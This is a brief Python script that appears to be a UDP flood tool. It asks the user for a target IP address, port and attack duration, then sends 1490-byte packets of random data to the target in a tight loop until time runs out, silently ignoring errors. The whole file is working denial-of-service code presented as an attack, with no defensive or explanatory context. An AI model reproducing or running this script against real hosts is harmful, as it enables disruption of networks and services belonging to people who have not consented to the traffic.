import socket
import random
import time

ip = input("Enter the target IP address: ")
port = int(input("Enter the target port: "))
duration = int(input("Enter the duration of the attack (in seconds): "))

timeout = time.time() + duration

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        s.sendto(bytes, (ip, port))
        if time.time() > timeout:
            break
    except KeyboardInterrupt:
        break
    except:
        pass
